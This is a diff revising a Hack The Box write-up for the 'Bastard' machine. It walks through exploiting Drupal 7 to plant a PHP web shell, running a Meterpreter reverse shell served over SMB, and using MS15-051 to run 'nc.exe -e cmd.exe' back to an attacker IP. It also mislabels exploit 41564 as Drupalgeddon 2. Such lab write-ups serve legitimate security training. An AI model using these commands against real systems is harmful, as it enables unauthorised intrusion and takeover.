@@ -8,11 +8,13 @@
 ## Initial Setup
 
 ### Preparing the Environment
-1. Store the target IP in a file for reuse:
+
+1. Store the target IP for reuse:
    ```bash
    echo 10.10.10.9 > target
    ```
-2. Add the target to your `/etc/hosts` file for easier navigation:
+
+2. Add the target to your `/etc/hosts`:
    ```
    10.10.10.9   bastard.htb
    ```
@@ -22,233 +24,215 @@
 ## Enumeration
 
 ### Full Port Scan
-I conducted a full TCP port scan to identify open ports:
+
+Conducted a full TCP port scan to identify open services:
+
 ```bash
 nmap -p- -v -iL target -oN nmap/full_tcp_scan.txt
 ```
 
-**Open Ports**:
-- 80/tcp -
-- 135/tcp - MSRPC
-- 49154/tcp - MSRPC
+Identified open ports:
+- `80/tcp` – HTTP (Microsoft IIS)
+- `135/tcp` – MSRPC
+- `49154/tcp` – MSRPC
+
+Then ran a service/version scan on those ports:
 
 ```bash
 nmap -p80,135,49154 -A -v -iL target -oN nmap/target_ports.txt
 ```
 
+**Nmap Results:**
 ```
 PORT      STATE SERVICE VERSION
 80/tcp    open  http    Microsoft IIS httpd 7.5
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 | http-robots.txt: 36 disallowed entries (15 shown)
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
 |_/LICENSE.txt /MAINTAINERS.txt
 |_http-title: Welcome to Bastard | Bastard
-|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
 |_http-server-header: Microsoft-IIS/7.5
 |_http-generator: Drupal 7 (http://drupal.org)
 135/tcp   open  msrpc   Microsoft Windows RPC
 49154/tcp open  msrpc   Microsoft Windows RPC
 ```
 
-### Port 80
+---
 
-The port 80 show me a Drupal login.
-You can read the version on nmap or also runngin the command:
+## Web Enumeration (Port 80)
+
+The site is running **Drupal 7**, confirmed via both Nmap and manually checking:
 
 ```bash
-curl -s http://bastard.htb/CHANGELOG.txt | grep -m2 ""
+curl -s http://bastard.htb/CHANGELOG.txt
 ```
 
-Here you can read the CHANGELOG: http://bastard.htb/CHANGELOG.txt .
-Here you can read the README: http://bastard.htb/README.txt .
+Also explored:
+- [CHANGELOG.txt](http://bastard.htb/CHANGELOG.txt)
+- [README.txt](http://bastard.htb/README.txt)
 
-![image](https://github.com/user-attachments/assets/bd363a40-deab-47b1-95dc-5a3b75cb61f9)
-
-Then I looking for known vulnerabilities:
+Used `searchsploit` to look for known Drupal 7 vulnerabilities:
 
 ```bash
 searchsploit Drupal 7
 ```
 
-I try to run several payload the only one that I successfully run was `php/webapps/41564.php`:
-
-![Screenshot from 2025-01-11 11-03-56](https://github.com/user-attachments/assets/3ed8366f-41cc-4cbd-ac4b-5376087bf787)
-
-I copied it locally by running:
+Selected and copied the following exploit locally:
 
 ```bash
 searchsploit -m php/webapps/41564.php
 ```
 
-There are some settings to change:
+---
 
-* url
-* rest endpoint
-* command to execute
+## Exploiting Drupal (Drupalgeddon 2 - Exploit 41564)
 
-![Screenshot from 2025-01-11 10-33-25](https://github.com/user-attachments/assets/645bf428-9c10-4d64-8a62-cdc6be4cef3a)
+**Payload**: `php/webapps/41564.php` (Drupal REST RCE)
 
-The url we already known, we need to find out the rest endpoint, to achive it I run `ffuf` command to enumerate directories:
+### Configuration
 
-```bash
-ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
--u "http://bastard.htb/FUZZ"
-```
-
-I discover the `rest` folder and I test it with curl:
-
-![Screenshot from 2025-01-11 11-10-34](https://github.com/user-attachments/assets/56c6d8c5-7f7d-411f-b419-0b892aa08c47)
-
-Then I change the file settings:
+Edit the script to set the correct target details:
 
 ```php
 $url = 'http://bastard.htb';
-$endpoint_path = '/rest';
+$endpoint_path = '/rest'; // discovered via ffuf
 $endpoint = 'rest_endpoint';
 
 $file = [
-	'filename' => 'spread.php',
+    'filename' => 'spread.php',
     'data' => '<?php system($_REQUEST["cmd"]); ?>'
 ];
 ```
 
-![Screenshot from 2025-01-11 10-37-37](https://github.com/user-attachments/assets/89926a8b-7320-47d5-bd45-3b53a3cf250a)
+### Finding the REST Endpoint
 
-To run the payload:
+Used `ffuf` to brute-force directories and discovered the `/rest` endpoint:
+
+```bash
+ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://bastard.htb/FUZZ"
+```
+
+Verified using `curl`:
+
+```bash
+curl http://bastard.htb/rest
+```
+
+### Execute the Exploit
+
+Ensure PHP has cURL support:
+
+```bash
+sudo apt install php-curl
+```
+
+Then run the exploit:
 
 ```bash
 php 41564.php
 ```
 
-But I got an error:
-
-![Screenshot from 2025-01-11 10-38-24](https://github.com/user-attachments/assets/c26142ad-52cc-4772-9a6a-69480efc13de)
-
-To fix it install the `php-curl` packet:
-
-```bash
-apt install php-curl
-```
-
-Then I run it again, it will create a new file:
-
-![Screenshot from 2025-01-11 10-43-43](https://github.com/user-attachments/assets/6b036c20-f4bd-490f-ad60-1aab8978ed82)
-
-You can test it by running:
+A web shell is uploaded as `spread.php`. Verify it works:
 
 ```bash
 curl "http://bastard.htb/spread.php?cmd=whoami"
 ```
 
-![Screenshot from 2025-01-11 11-15-45](https://github.com/user-attachments/assets/87e6255d-b785-40bd-8a5a-73851cca01f4)
+---
 
-With msfvenom I generated an executable:
+## Gaining a Reverse Shell
+
+### Generate Payload
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8887 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your-IP> LPORT=8887 -f exe -o shell.exe
 ```
 
-I started an smbclient:
+### Host Payload
+
+Serve it via SMB:
 
 ```bash
-impacket-smbserver -ip <IP> shares .
+impacket-smbserver -ip <Your-IP> shares .
 ```
 
-With msfconsole I started a handler:
+### Start Meterpreter Handler
 
 ```bash
+msfconsole
 use exploit/multi/handler
-set LHOST <IP>
-set LPORT 8887
 set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <Your-IP>
+set LPORT 8887
 run
 ```
 
-And then I run, with curl, the executable:
+### Trigger Execution
 
 ```bash
 curl "http://bastard.htb/spread.php" \
---data-urlencode 'cmd=cmd /c "\\<IP>\shares\shell.exe"' 
+--data-urlencode 'cmd=cmd /c "\\<Your-IP>\shares\shell.exe"'
 ```
 
-In the user directory I found the flag.
+This spawns a Meterpreter session.
 
-## Privile Escalation
+---
 
-Syteminformation:
+## Privilege Escalation
+
+### System Information
+
+Gathered with `systeminfo`:
 
 ```
-systeminfo
-
-Host Name:                 BASTARD
-OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
-OS Version:                6.1.7600 N/A Build 7600
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Standalone Server
-OS Build Type:             Multiprocessor Free
-Registered Owner:          Windows User
-Registered Organization:   
-Product ID:                55041-402-3582622-84461
-Original Install Date:     18/3/2017, 7:04:46 ��
-System Boot Time:          18/1/2025, 2:52:09 ��
-System Manufacturer:       VMware, Inc.
-System Model:              VMware Virtual Platform
-System Type:               x64-based PC
-Processor(s):              2 Processor(s) Installed.
-                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
-                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             el;Greek
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
-Total Physical Memory:     2.047 MB
-Available Physical Memory: 1.596 MB
-Virtual Memory: Max Size:  4.095 MB
-Virtual Memory: Available: 3.619 MB
-Virtual Memory: In Use:    476 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    HTB
-Logon Server:              N/A
-Hotfix(s):                 N/A
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: Intel(R) PRO/1000 MT Network Connection
-                                 Connection Name: Local Area Connection
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.9
+OS: Microsoft Windows Server 2008 R2 Datacenter (Build 7600)
+Patch Status: No Hotfixes Installed
+...
 ```
 
-You can notice `Hotfix(s)` to `N/A`, this could be a kernel exploit.
+Since there are no hotfixes, the target is likely vulnerable to **MS15-051** (Kernel Priv Esc).
 
-Here that one I used: [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051). Download the zip, unzip it.
+### Exploitation: MS15-051
 
-From the local machine run a smbserver in your exploit path.
-In the remote one test it by running:
+Exploit used: [MS15-051 GitHub Repo](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)
 
-```cmd
-\\<IP>\share\ms15-051x64.exe "whoami /all"
-```
+1. Download and extract exploit files.
+2. Host the exploit using SMB:
 
-Start a netcat listener:
+   ```bash
+   impacket-smbserver -ip <Your-IP> share .
+   ```
 
-```bash
-nc -lvnp
-```
+3. From the target, test it:
 
-Copy a netcat in your shared folder and then run:
+   ```cmd
+   \\<Your-IP>\share\ms15-051x64.exe "whoami /all"
+   ```
 
-```cmd
-\\10.10.16.3\share\ms15-051x64.exe "\\10.10.16.3\share\nc.exe -e cmd.exe 10.10.16.3 443"
-```
+4. Upload `nc.exe` to SMB and spawn a shell:
 
-You should have root privileges.
+   Start listener:
+   ```bash
+   nc -lvnp 443
+   ```
+
+   Then from the target:
+   ```cmd
+   \\<Your-IP>\share\ms15-051x64.exe "\\<Your-IP>\share\nc.exe -e cmd.exe <Your-IP> 443"
+   ```
+
+You should now have **SYSTEM** access.
+
+---
+
+## Notes
+
+- Drupalgeddon 2 can be finicky—make sure you find the right endpoint.
+- Kernel exploits like MS15-051 are highly reliable on unpatched Win 2008 systems.
+- Always clean up after your session if you're working on a shared instance.
 
 ---
